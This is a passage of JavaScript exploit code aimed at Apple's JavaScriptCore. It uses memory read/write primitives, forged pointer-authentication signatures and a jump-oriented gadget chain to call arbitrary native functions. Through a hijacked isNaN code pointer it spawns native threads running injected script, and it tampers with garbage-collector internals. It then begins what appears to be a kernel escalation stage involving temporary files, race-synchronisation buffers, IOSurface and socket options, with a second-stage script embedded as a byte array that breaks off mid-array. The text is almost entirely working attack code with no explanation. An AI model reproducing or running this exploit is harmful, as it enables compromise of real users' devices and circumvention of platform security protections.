fcall_init();
let PAGE_SIZE = 0x4000n;
let KERN_SUCCESS = 0n;
let CALLOC = func_resolve("calloc");
let MALLOC = func_resolve("malloc");
let FREE = func_resolve("free");
let MEMCPY = func_resolve("memcpy");
let MEMSET = func_resolve("memset");
let SLEEP = func_resolve("sleep");
let USLEEP = func_resolve("usleep");
let STRCMP = func_resolve("strcmp");
let STRCPY = func_resolve("strcpy");
let STRNCPY = func_resolve("strncpy");
let SNPRINTF = func_resolve("snprintf");
let PRINTF = func_resolve("printf");
let ERRNO = func_resolve("errno");
let CLOSE = func_resolve("close");
let EXIT = func_resolve("exit");
let GETCHAR = func_resolve("getchar");
let GETPID = func_resolve("getpid");
let SYSCALL = func_resolve("syscall");
let MACH_VM_ALLOCATE = func_resolve("mach_vm_allocate");
let MACH_VM_DEALLOCATE = func_resolve("mach_vm_deallocate");
let MACH_ERROR_STRING = func_resolve("mach_error_string");
let MACH_PORT_ALLOCATE = func_resolve("mach_port_allocate");
let kIOMasterPortDefault = func_resolve("kIOMasterPortDefault");
function assert(a, b = "N/A") {
  if (!a) {
    throw new Error(`assert failed: ${b}`);
  }
}
function ERROR(a) {
  throw new Error(a);
}
function new_uint64_t(val = 0n) {
  let buf = calloc(1n, 8n);
  uwrite64(buf, val);
  return buf;
}
function mach_task_self() {
  return 0x203n;
}
function calloc(...args) {
  return fcall(CALLOC, ...args);
}
function malloc(...args) {
  return fcall(MALLOC, ...args);
}
function free(...args) {
  return fcall(FREE, ...args);
}
function memcpy(...args) {
  return fcall(MEMCPY, ...args);
}
function memset(...args) {
  return fcall(MEMSET, ...args);
}
function sleep(...args) {
  return fcall(SLEEP, ...args);
}
function usleep(...args) {
  return fcall(USLEEP, ...args);
}
function strcmp(...args) {
  return fcall(STRCMP, ...args);
}
function strcpy(...args) {
  return fcall(STRCPY, ...args);
}
function strncpy(...args) {
  return fcall(STRNCPY, ...args);
}
function snprintf(...args) {
  return fcall(SNPRINTF, buf, size, fmt, 0n, 0n, 0n, 0n, 0n, ...args);
}
function printf(...args) {
  return fcall(PRINTF, get_cstring(fmt), 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args);
}
function close(...args) {
  return fcall(CLOSE, ...args);
}
function exit(...args) {
  return fcall(EXIT, ...args);
}
function getchar(...args) {
  return fcall(GETCHAR, ...args);
}
function getpid(...args) {
  return fcall(GETPID, ...args);
}
function syscall(num, ...args) {
  return fcall(SYSCALL, num, 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args);
}
function mach_vm_allocate(...args) {
  return fcall(MACH_VM_ALLOCATE, ...args);
}
function mach_vm_deallocate(...args) {
  return fcall(MACH_VM_DEALLOCATE, ...args);
}
function mach_error_string(...args) {
  return fcall(MACH_ERROR_STRING, ...args);
}
function mach_port_allocate(...args) {
  return fcall(MACH_PORT_ALLOCATE, ...args);
}
let g_device_machine = 0n;
function get_device_machine() {
  if (g_device_machine == 0n) {
    let utsname = calloc(256n, 5n);
    fcall(UNAME, utsname);
    g_device_machine = utsname + 256n * 4n;
  }
  return g_device_machine;
}
let OBJC_ALLOC = func_resolve("objc_alloc");
let OBJC_ALLOC_INIT = func_resolve("objc_alloc_init");
let OBJC_GETCLASS = func_resolve("objc_getClass");
let OBJC_MSGSEND = func_resolve("objc_msgSend");
let SEL_REGISTERNAME = func_resolve("sel_registerName");
let CFDICTIONARYCREATEMUTABLE = func_resolve("CFDictionaryCreateMutable");
let CFDICTIONARYSETVALUE = func_resolve("CFDictionarySetValue");
let CFNUMBERCREATE = func_resolve("CFNumberCreate");
let CFRELEASE = func_resolve("CFRelease");
let CFSHOW = func_resolve("CFShow");
let CFSTRINGCREATECOPY = func_resolve("CFStringCreateCopy");
let CFSTRINGCREATEWITHCSTRING = func_resolve("CFStringCreateWithCString");
let kCFAllocatorDefault = uread64(func_resolve("kCFAllocatorDefault").noPAC());
let kCFStringEncodingUTF8 = 0x08000100n;
let kCFTypeDictionaryKeyCallBacks = func_resolve("kCFTypeDictionaryKeyCallBacks").noPAC();
let kCFTypeDictionaryValueCallBacks = func_resolve("kCFTypeDictionaryValueCallBacks").noPAC();
function CFDictionaryCreateMutable(...args) {
  return fcall(CFDICTIONARYCREATEMUTABLE, ...args);
}
function CFDictionarySetValue(...args) {
  return fcall(CFDICTIONARYSETVALUE, ...args);
}
function CFNumberCreate(...args) {
  return fcall(CFNUMBERCREATE, ...args);
}
function CFRelease(...args) {
  return fcall(CFRELEASE, ...args);
}
function CFShow(...args) {
  return fcall(CFSHOW, ...args);
}
function CFStringCreateCopy(...args) {
  return fcall(CFSTRINGCREATECOPY, ...args);
}
function CFStringCreateWithCString(...args) {
  return fcall(CFSTRINGCREATEWITHCSTRING, ...args);
}
function objc_alloc(class_obj) {
  return fcall(OBJC_ALLOC, class_obj);
}
function objc_alloc_init(class_obj) {
  return fcall(OBJC_ALLOC_INIT, class_obj);
}
function objc_getClass(class_name) {
  return fcall(OBJC_GETCLASS, get_cstring(class_name));
}
function objc_msgSend(...args) {
  return fcall(OBJC_MSGSEND, ...args);
}
function sel_registerName(cstr) {
  return fcall(SEL_REGISTERNAME, cstr);
}
let selector_evaluateScript = sel_registerName(get_cstring("evaluateScript:"));
let selector_initWithTarget_selector_object = sel_registerName(get_cstring("initWithTarget:selector:object:"));
let selector_invocationWithMethodSignature = sel_registerName(get_cstring("invocationWithMethodSignature:"));
let selector_invoke = sel_registerName(get_cstring("invoke"));
let selector_isFinished = sel_registerName(get_cstring("isFinished"));
let selector_methodSignatureForSelector = sel_registerName(get_cstring("methodSignatureForSelector:"));
let selector_objectForKeyedSubscript = sel_registerName(get_cstring("objectForKeyedSubscript:"));
let selector_release = sel_registerName(get_cstring("release"));
let selector_retainCount = sel_registerName(get_cstring("retainCount"));
let selector_setArgument_atIndex = sel_registerName(get_cstring("setArgument:atIndex:"));
let selector_start = sel_registerName(get_cstring("start"));
let invoke_class = objc_getClass("NSInvocation");
let jsc_class = objc_getClass("JSContext");
let nsthread_class = objc_getClass("NSThread");
function create_cfstring(cstring) {
  return CFStringCreateWithCString(kCFAllocatorDefault, cstring, kCFStringEncodingUTF8);
}
let cfstr_boxed_arr = create_cfstring(get_cstring("boxed_arr"));
let cfstr_control_array = create_cfstring(get_cstring("control_array"));
let cfstr_control_array_8 = create_cfstring(get_cstring("control_array_8"));
let cfstr_func_offsets_array = create_cfstring(get_cstring("func_offsets_array"));
let cfstr_isNaN = create_cfstring(get_cstring("isNaN"));
let cfstr_rw_array = create_cfstring(get_cstring("rw_array"));
let cfstr_rw_array_8 = create_cfstring(get_cstring("rw_array_8"));
let cfstr_unboxed_arr = create_cfstring(get_cstring("unboxed_arr"));
function create_cfstring_copy(cfstring) {
  return CFStringCreateCopy(kCFAllocatorDefault, cfstring);
}
function object_retainCount(obj) {
  return objc_msgSend(obj, selector_retainCount);
}
function object_release(obj) {
  return objc_msgSend(obj, selector_release);
}
function objectForKeyedSubscript(obj, cfstr_key) {
  return objc_msgSend(obj, selector_objectForKeyedSubscript, cfstr_key);
}
function evaluateScript(obj, jscript) {
  return objc_msgSend(obj, selector_evaluateScript, jscript);
}
function methodSignatureForSelector(obj, sel) {
  return objc_msgSend(obj, selector_methodSignatureForSelector, sel);
}
function invocationWithMethodSignature(obj, sig) {
  return objc_msgSend(obj, selector_invocationWithMethodSignature, sig);
}
function setArgument_atIndex(obj, arg, idx) {
  return objc_msgSend(obj, selector_setArgument_atIndex, arg, idx);
}
function initWithTarget_selector_object(obj, target, sel, object) {
  return objc_msgSend(obj, selector_initWithTarget_selector_object, target, sel, object);
}
function nsthread_start(obj) {
  return objc_msgSend(obj, selector_start);
}
function setup_fcall_jopchain() {
  let jsvm_fcall_buff = malloc(PAGE_SIZE);
  let load_x1x3x8_args = jsvm_fcall_buff + 0x100n;
  let jsvm_fcall_args = jsvm_fcall_buff + 0x200n;
  uwrite64(jsvm_fcall_buff + 0x0n, load_x1x3x8_args);
  uwrite64(jsvm_fcall_buff + 0x8n, pacia(load_x1x3x8, 0n));
  uwrite64(jsvm_fcall_buff + 0x10n, pacia(_CFObjectCopyProperty, 0n));
  uwrite64(jsvm_fcall_buff + 0x40n, pacia(jsvm_isNAN_fcall_gadget2, 0n));
  uwrite64(load_x1x3x8_args + 0x20n, load_x1x3x8_args + 0x40n);
  uwrite64(load_x1x3x8_args + 0x28n, jsvm_fcall_args - 0x10n);
  uwrite64(load_x1x3x8_args + 0x30n, pacia(0x41414141n, 0xC2D0n));
  uwrite64(load_x1x3x8_args + 0x50n, pacia(fcall_14_args_write_x8, load_x1x3x8_args + 0x50n));
  return {
    "jsvm_fcall_buff": jsvm_fcall_buff,
    "jsvm_fcall_pc": load_x1x3x8_args + 0x30n,
    "jsvm_fcall_args": jsvm_fcall_args
  };
}
let evaluateScript_invocation = 0n;
function js_thread_spawn(js_script_nsstring, target_thread_arg = 0x0n) {
  if (typeof js_script_nsstring === "string") {
    js_script_nsstring = create_cfstring(get_cstring(js_script_nsstring));
  } else if (typeof js_script_nsstring === "object") {
    js_script_nsstring = create_cfstring(uread64(addrof(js_script_nsstring) + 0x10n));
  } else {
    js_script_nsstring = create_cfstring_copy(js_script_nsstring);
  }
  let jop_chain_info = setup_fcall_jopchain();
  let jsvm_fcall_buff = jop_chain_info["jsvm_fcall_buff"];
  let jsvm_fcall_pc = jop_chain_info["jsvm_fcall_pc"];
  let jsvm_fcall_args = jop_chain_info["jsvm_fcall_args"];
  let ctx = objc_alloc_init(jsc_class);
  let isnan_value = objectForKeyedSubscript(ctx, cfstr_isNaN);
  let isnan_func_addr = uread64(isnan_value + 0x8n);
  let isnan_executable_addr = uread64(isnan_func_addr + 0x18n);
  let isnan_code_ptr = isnan_executable_addr + 0x28n;
  evaluateScript(ctx, stage1_js);
  let unboxed_arr_value = objectForKeyedSubscript(ctx, cfstr_unboxed_arr);
  let unboxed_arr_addr = uread64(unboxed_arr_value + 0x8n);
  let boxed_arr_value = objectForKeyedSubscript(ctx, cfstr_boxed_arr);
  let boxed_arr_addr = uread64(boxed_arr_value + 0x8n);
  let boxed_arr_butter = uread64(boxed_arr_addr + 0x8n);
  uwrite64(unboxed_arr_addr + 0x8n, boxed_arr_butter);
  let rw_array_addr = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array) + 0x8n);
  let control_array_addr = uread64(objectForKeyedSubscript(ctx, cfstr_control_array) + 0x8n);
  let rw_array_buffer_bk = uread64(rw_array_addr + 0x10n);
  let control_array_buffer_bk = uread64(control_array_addr + 0x10n);
  uwrite64(control_array_addr + 0x10n, rw_array_addr + 0x10n);
  let rw_array_8_addr = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array_8) + 0x8n);
  let control_array_8_addr = uread64(objectForKeyedSubscript(ctx, cfstr_control_array_8) + 0x8n);
  let rw_array_8_buffer_bk = uread64(rw_array_8_addr + 0x10n);
  let control_array_8_buffer_bk = uread64(control_array_8_addr + 0x10n);
  uwrite64(control_array_8_addr + 0x10n, rw_array_8_addr + 0x10n);
  let signing_ctx = 0x4911n;
  let signed_fcall_addr = pacib(jsvm_isNAN_fcall_gadget, signing_ctx);
  uwrite64(isnan_code_ptr, signed_fcall_addr);
  let new_func_offsets = objectForKeyedSubscript(ctx, cfstr_func_offsets_array);
  let new_func_offsets_addr = uread64(new_func_offsets + 0x8n);
  let new_func_offsets_buffer = uread64(new_func_offsets_addr + 0x10n);
  memcpy(new_func_offsets_buffer, func_offsets_buffer, PAGE_SIZE);
  uwrite64(new_func_offsets_buffer + 3n * 0x8n, target_thread_arg);
  uwrite64(new_func_offsets_buffer + 5n * 0x8n, jsvm_fcall_buff);
  uwrite64(new_func_offsets_buffer + 6n * 0x8n, jsvm_fcall_pc);
  uwrite64(new_func_offsets_buffer + 7n * 0x8n, jsvm_fcall_args);
  if (evaluateScript_invocation == 0n) {
    let evaluateScript_signature = methodSignatureForSelector(ctx, selector_evaluateScript);
    evaluateScript_invocation = invocationWithMethodSignature(invoke_class, evaluateScript_signature);
    setArgument_atIndex(evaluateScript_invocation, new_uint64_t(selector_evaluateScript), 1n);
  }
  setArgument_atIndex(evaluateScript_invocation, new_uint64_t(ctx), 0n);
  setArgument_atIndex(evaluateScript_invocation, new_uint64_t(js_script_nsstring), 2n);
  let nsthread = objc_alloc(nsthread_class);
  initWithTarget_selector_object(nsthread, evaluateScript_invocation, selector_invoke, 0n);
  nsthread_start(nsthread);
  return {
    "thread_handle": nsthread,
    "js_ctx": ctx,
    "jop_chain_info": jop_chain_info,
    "js_script_nsstring": js_script_nsstring,
    "rw_array_buffer_bk": rw_array_buffer_bk,
    "control_array_buffer_bk": control_array_buffer_bk,
    "rw_array_8_buffer_bk": rw_array_8_buffer_bk,
    "control_array_8_buffer_bk": control_array_8_buffer_bk
  };
}
function js_thread_join(js_thread) {
  let jop_chain_info = js_thread["jop_chain_info"];
  let js_ctx = js_thread["js_ctx"];
  let js_script_nsstring = js_thread["js_script_nsstring"];
  let nsthread = js_thread["thread_handle"];
  while (true) {
    let isFinished = objc_msgSend(nsthread, selector_isFinished);
    if (isFinished == 1n) {
      break;
    }
  }
  object_release(nsthread);
  uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array) + 0x8n) + 0x10n, js_thread["rw_array_buffer_bk"]);
  uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array) + 0x8n) + 0x10n, js_thread["control_array_buffer_bk"]);
  uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array_8) + 0x8n) + 0x10n, js_thread["rw_array_8_buffer_bk"]);
  uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array_8) + 0x8n) + 0x10n, js_thread["control_array_8_buffer_bk"]);
  let jsc_ref_count = object_retainCount(js_ctx);
  for (let i = 0n; i < jsc_ref_count; i++) {
    object_release(js_ctx);
  }
  CFRelease(js_script_nsstring);
  free(jop_chain_info["jsvm_fcall_buff"]);
}
let RTLD_DEFAULT = 0xFFFFFFFFFFFFFFFEn;
let VM_FLAGS_ANYWHERE = 1n;
let VM_FLAGS_FIXED = 0n;
let VM_FLAGS_OVERWRITE = 0x4000n;
let VM_FLAGS_RANDOM_ADDR = 8n;
let VM_INHERIT_NONE = 2n;
let VM_PROT_DEFAULT = 3n;
let PROT_READ = 0x1n;
let PROT_WRITE = 0x2n;
let MAP_SHARED = 0x1n;
let AF_INET6 = 30n;
let SOCK_DGRAM = 2n;
let IPPROTO_ICMPV6 = 58n;
let ICMP6_FILTER = 18n;
let SEEK_SET = 0n;
let _NSGETEXECUTABLEPATH = func_resolve("_NSGetExecutablePath");
let ACCESS = func_resolve("access");
let CONFSTR = func_resolve("confstr");
let FCNTL = func_resolve("fcntl");
let FSYNC = func_resolve("fsync");
let FILEPORT_MAKEFD = func_resolve("fileport_makefd");
let FILEPORT_MAKEPORT = func_resolve("fileport_makeport");
let FOPEN = func_resolve("fopen");
let FCLOSE = func_resolve("fclose");
let FWRITE = func_resolve("fwrite");
let GETSOCKOPT = func_resolve("getsockopt");
let LSEEK = func_resolve("lseek");
let MACH_THREAD_SELF = func_resolve("mach_thread_self");
let MEMMEM = func_resolve("memmem");
let MEMSET_PATTERN8 = func_resolve("memset_pattern8");
let OPEN = func_resolve("open");
let PREADV = func_resolve("preadv");
let PWRITEV = func_resolve("pwritev");
let PWRITE = func_resolve("pwrite");
let PREAD = func_resolve("pread");
let READ = func_resolve("read");
let SETSOCKOPT = func_resolve("setsockopt");
let SOCKET = func_resolve("socket");
let STRCAT = func_resolve("strcat");
let STRSTR = func_resolve("strstr");
let STRLEN = func_resolve("strlen");
let STRNCMP = func_resolve("strncmp");
let STRRCHR = func_resolve("strrchr");
let PTHREAD_SELF = func_resolve("pthread_self");
let PTHREAD_JOIN = func_resolve("pthread_join");
let WRITE = func_resolve("write");
let REMOVE = func_resolve("remove");
let ARC4RANDOM = func_resolve("arc4random");
let TASK_THREADS = func_resolve("task_threads");
let THREAD_SUSPEND = func_resolve("thread_suspend");
let MACH_MAKE_MEMORY_ENTRY_64 = func_resolve("mach_make_memory_entry_64");
let MACH_PORT_DEALLOCATE = func_resolve("mach_port_deallocate");
let MACH_VM_MAP = func_resolve("mach_vm_map");
let MMAP = func_resolve("mmap");
let MLOCK = func_resolve("mlock");
let MUNLOCK = func_resolve("munlock");
let UNAME = func_resolve("uname");
let IOSURFACECREATE = func_resolve("IOSurfaceCreate");
let IOSURFACEPREFETCHPAGES = func_resolve("IOSurfacePrefetchPages");
let IOSURFACEGETBASEADDRESS = func_resolve("IOSurfaceGetBaseAddress");
let kIOSurfaceAllocSize = uread64(func_resolve("kIOSurfaceAllocSize").noPAC());
function DUMP(addr, sz) {}
function js_malloc(sz) {
  buff = new Uint8Array(BigInt(sz).asInt32s).fill(0x00);
  return uread64(mem.addrof(buff) + 0x10n);
}
function mach_thread_self() {
  return fcall(MACH_THREAD_SELF);
}
function pthread_getspecific(key) {
  return fcall(PTHREAD_GETSPECIFIC, key);
}
function pthread_self() {
  return fcall(PTHREAD_SELF);
}
function pthread_join(thr, val) {
  return fcall(PTHREAD_JOIN, thr, val);
}
function _NSGetExecutablePath(executable_path, length_ptr) {
  return fcall(_NSGETEXECUTABLEPATH, executable_path, length_ptr);
}
function confstr(name, buf, len) {
  return fcall(CONFSTR, name, buf, len);
}
function strrchr(s, c) {
  return fcall(STRRCHR, s, c);
}
function strcat(s1, s2) {
  return fcall(STRCAT, s1, s2);
}
function strlen(s) {
  return fcall(STRLEN, s);
}
function strstr(s1, s2) {
  return fcall(STRSTR, s1, s2);
}
function strncmp(s1, s2, n) {
  return fcall(STRNCMP, s1, s2, n);
}
function socket(domain, type, protocol) {
  return fcall(SOCKET, domain, type, protocol);
}
function getsockopt(socket, level, option_name, option_value, option_len) {
  return fcall(GETSOCKOPT, socket, level, option_name, option_value, option_len);
}
function setsockopt(socket, level, option_name, option_value, option_len) {
  return fcall(SETSOCKOPT, socket, level, option_name, option_value, option_len);
}
function fileport_makeport(fd, port) {
  return fcall(FILEPORT_MAKEPORT, fd, port);
}
function fileport_makefd(port) {
  return fcall(FILEPORT_MAKEFD, port);
}
function memset_pattern8(buf, val, sz) {
  return fcall(MEMSET_PATTERN8, buf, val, sz);
}
function memmem(big, big_len, little, little_len) {
  return fcall(MEMMEM, big, big_len, little, little_len);
}
function access(path, mode) {
  return fcall(ACCESS, path, mode);
}
function open(path, mode) {
  return fcall(OPEN, path, mode);
}
function fopen(path, mode) {
  return fcall(FOPEN, path, mode);
}
function fclose(fd) {
  return fcall(FCLOSE, fd);
}
function fwrite(buf, sz, nitem, fd) {
  return fcall(FWRITE, buf, sz, nitem, fd);
}
function preadv(fildes, iov, iovcnt, offset) {
  return fcall(PREADV, fildes, iov, iovcnt, offset);
}
function pwritev(fildes, iov, iovcnt, offset) {
  return fcall(PWRITEV, fildes, iov, iovcnt, offset);
}
function pwrite(fildes, buff, size, offset) {
  return fcall(PWRITE, fildes, buff, size, offset);
}
function pread(fildes, buff, size, offset) {
  return fcall(PREAD, fildes, buff, size, offset);
}
function read(fd, buf, sz) {
  return fcall(READ, fd, buf, sz);
}
function write(fd, buf, sz) {
  return fcall(WRITE, fd, buf, sz);
}
function remove(path) {
  return fcall(REMOVE, path);
}
function arc4random() {
  return fcall(ARC4RANDOM);
}
function task_threads(task, thread_list_addr, thread_count_addr) {
  return fcall(TASK_THREADS, task, thread_list_addr, thread_count_addr);
}
function fcntl(fd, flag, value) {
  return fcall(FCNTL, fd, flag, 0n, 0n, 0n, 0n, 0n, 0n, value);
}
function lseek(fildes, offset, whence) {
  return fcall(LSEEK, fildes, offset, whence);
}
function fsync(fd) {
  return fcall(FSYNC, fd);
}
function CFStringCreateWithCString(allocator, cstring, encoding) {
  return fcall(CFSTRINGCREATEWITHCSTRING, allocator, cstring, encoding);
}
function CFStringCreateCopy(allocator, cfstring) {
  return fcall(CFSTRINGCREATECOPY, allocator, cfstring);
}
function CFDictionarySetValue(dict, key, value) {
  return fcall(CFDICTIONARYSETVALUE, dict, key, value);
}
function CFNumberCreate(allocator, theType, valuePtr) {
  return fcall(CFNUMBERCREATE, allocator, theType, valuePtr);
}
function IOSurfaceCreate(dict) {
  return fcall(IOSURFACECREATE, dict);
}
function IOSurfaceGetBaseAddress(surface) {
  return fcall(IOSURFACEGETBASEADDRESS, surface);
}
function IOSurfacePrefetchPages(surface) {
  return fcall(IOSURFACEPREFETCHPAGES, surface);
}
function CFRelease(obj) {
  return fcall(CFRELEASE, obj);
}
function CFShow(obj) {
  return fcall(CFSHOW, obj);
}
function mach_make_memory_entry_64(target_task, size, offset, permission, object_handle, parent_entry) {
  return fcall(MACH_MAKE_MEMORY_ENTRY_64, target_task, size, offset, permission, object_handle, parent_entry);
}
function mach_vm_map(target_task, address, size, mask, flags, object, offset, copy, cur_protection, max_protection, inheritance) {
  return fcall(MACH_VM_MAP, target_task, address, size, mask, flags, object, offset, copy, cur_protection | max_protection << 32n, inheritance);
}
function mmap(addr, len, prot, flags, fd, offset) {
  return fcall(MMAP, addr, len, prot, flags, fd, offset);
}
function mlock(address, size) {
  return fcall(MLOCK, address, size);
}
function munlock(address, size) {
  return fcall(MUNLOCK, address, size);
}
function mach_port_deallocate(task, name) {
  return fcall(MACH_PORT_DEALLOCATE, task, name);
}
function mach_task_self() {
  return 0x203n;
}
function new_uint64_t(val = 0n) {
  let buf = calloc(1n, 8n);
  uwrite64(buf, val);
  return buf;
}
function disable_gc() {
  let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
  let heap = vm + 0xc0n;
  let isSafeToCollect = heap + 0x241n;
  uwrite64(isSafeToCollect, 0n);
}
function enable_gc() {
  let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
  let heap = vm + 0xc0n;
  let isSafeToCollect = heap + 0x241n;
  uwrite64(isSafeToCollect, 1n);
}
function disarm_gc() {
  let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
  let heap = vm + 0xc0n;
  let m_threadGroup = uread64(heap + 0x198n);
  let threads = uread64(m_threadGroup);
  uwrite64(threads + 0x20n, 0x0n);
}
disable_gc();
disarm_gc();
enable_gc();
let executable_name = 0n;
let read_file_path = 0n;
let write_file_path = 0n;
let target_file_size = PAGE_SIZE * 0x2n;
let oob_offset = 0x100n;
let oob_size = 0xf00n;
let n_of_oob_pages = 2n;
let pc_address = new_bigint();
let pc_size = 0n;
let pc_object = new_bigint();
let free_target = 0n;
let free_target_size = 0n;
let write_fd = 0n;
let read_fd = 0n;
let random_marker = arc4random() << 32n | arc4random();
let wired_page_marker = arc4random() << 32n | arc4random();
let free_thread_start_ptr = 0n;
let free_target_sync_ptr = 0n;
let free_target_size_sync_ptr = 0n;
let target_object_sync_ptr = 0n;
let target_object_offset_sync_ptr = 0n;
let go_sync_ptr = 0n;
let race_sync_ptr = 0n;
let free_thread_jsthread = 0n;
let free_thread_arg = 0n;
function init_target_file() {
  let _CS_DARWIN_USER_TEMP_DIR = 65537n;
  read_file_path = calloc(1n, 1024n);
  write_file_path = calloc(1n, 1024n);
  confstr(_CS_DARWIN_USER_TEMP_DIR, read_file_path, 1024n);
  confstr(_CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024n);
  strcat(read_file_path, get_cstring(`/${arc4random().hex()}`));
  strcat(write_file_path, get_cstring(`/${arc4random().hex()}`));
  create_target_file(read_file_path);
  create_target_file(write_file_path);
  read_fd = open(read_file_path, 0x2n);
  write_fd = open(write_file_path, 0x2n);
  LOG("[+] read_fd: " + read_fd.hex());
  LOG("[+] write_fd: " + write_fd.hex());
  remove(read_file_path);
  remove(write_file_path);
  fcntl(read_fd, 48n, 1n);
  fcntl(write_fd, 48n, 1n);
}
function pe_init() {
  init_target_file();
  if (executable_name == 0n) {
    let length = BigInt("0x1024");
    let executable_path = calloc(1n, length);
    _NSGetExecutablePath(executable_path, get_bigint_addr(length));
    executable_name = strrchr(executable_path, 0x2fn);
    if (executable_name != 0n) {
      executable_name = executable_name + 0x1n;
    } else {
      executable_name = executable_path;
    }
  }
  free_thread_arg = calloc(1n, PAGE_SIZE);
  LOG("[+] free_thread_arg: " + free_thread_arg.hex());
  free_thread_start_ptr = free_thread_arg;
  free_target_sync_ptr = free_thread_arg + 0x8n;
  free_target_size_sync_ptr = free_thread_arg + 0x10n;
  target_object_sync_ptr = free_thread_arg + 0x18n;
  target_object_offset_sync_ptr = free_thread_arg + 0x20n;
  go_sync_ptr = free_thread_arg + 0x28n;
  race_sync_ptr = free_thread_arg + 0x30n;
  let free_thread_js_data = new Uint8Array([102, 99, 97, 108, 108, 95, 105, 110, 105, 116, 40, 41, 59, 10, 108, 101, 116, 32, 80, 65, 71, 69, 95, 83, 73, 90, 69, 32, 32, 32, 32, 61, 32, 48, 120, 52, 48, 48, 48, 110, 59, 10, 108, 101, 116, 32, 75, 69, 82, 78, 95, 83, 85, 67, 67, 69, 83, 83, 32, 61, 32, 48, 110, 59, 10, 10, 108, 101, 116, 32, 67, 65, 76, 76, 79, 67, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 99, 97, 108, 108, 111, 99, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 76, 76, 79, 67, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 108, 108, 111, 99, 34, 41, 59, 10, 108, 101, 116, 32, 70, 82, 69, 69, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 114, 101, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 77, 69, 77, 67, 80, 89, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 99, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 77, 69, 77, 83, 69, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 115, 101, 116, 34, 41, 59, 10, 10, 108, 101, 116, 32, 83, 76, 69, 69, 80, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 108, 101, 101, 112, 34, 41, 59, 10, 108, 101, 116, 32, 85, 83, 76, 69, 69, 80, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 117, 115, 108, 101, 101, 112, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 67, 77, 80, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 99, 109, 112, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 67, 80, 89, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 99, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 78, 67, 80, 89, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 110, 99, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 83, 78, 80, 82, 73, 78, 84, 70, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 110, 112, 114, 105, 110, 116, 102, 34, 41, 59, 10, 108, 101, 116, 32, 80, 82, 73, 78, 84, 70, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 114, 105, 110, 116, 102, 34, 41, 59, 10, 10, 108, 101, 116, 32, 69, 82, 82, 78, 79, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 101, 114, 114, 110, 111, 34, 41, 59, 10, 108, 101, 116, 32, 67, 76, 79, 83, 69, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 99, 108, 111, 115, 101, 34, 41, 59, 10, 108, 101, 116, 32, 69, 88, 73, 84, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 101, 120, 105, 116, 34, 41, 59, 10, 108, 101, 116, 32, 71, 69, 84, 67, 72, 65, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 103, 101, 116, 99, 104, 97, 114, 34, 41, 59, 10, 108, 101, 116, 32, 71, 69, 84, 80, 73, 68, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 103, 101, 116, 112, 105, 100, 34, 41, 59, 10, 108, 101, 116, 32, 83, 89, 83, 67, 65, 76, 76, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 121, 115, 99, 97, 108, 108, 34, 41, 59, 10, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 86, 77, 95, 65, 76, 76, 79, 67, 65, 84, 69, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 118, 109, 95, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 86, 77, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 118, 109, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 